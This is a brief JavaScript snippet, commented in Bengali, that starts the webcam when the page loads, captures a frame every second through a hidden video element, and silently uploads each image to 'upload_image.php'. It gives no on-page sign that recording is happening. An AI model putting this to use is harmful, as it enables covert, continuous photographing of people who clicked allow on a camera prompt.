const captureInterval = 1000; // প্রতি 1 সেকেন্ডে
const uploadUrl = "upload_image.php"; // সার্ভারে ইমেজ পাঠাবে

async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    video.play();

    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");

    setInterval(() => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("image", blob, "capture.jpg");
        fetch(uploadUrl, {
          method: "POST",
          body: formData,
        });
      }, "image/jpeg");
    }, captureInterval);
  } catch (err) {
    console.error("Camera error:", err);
  }
}

startCamera();
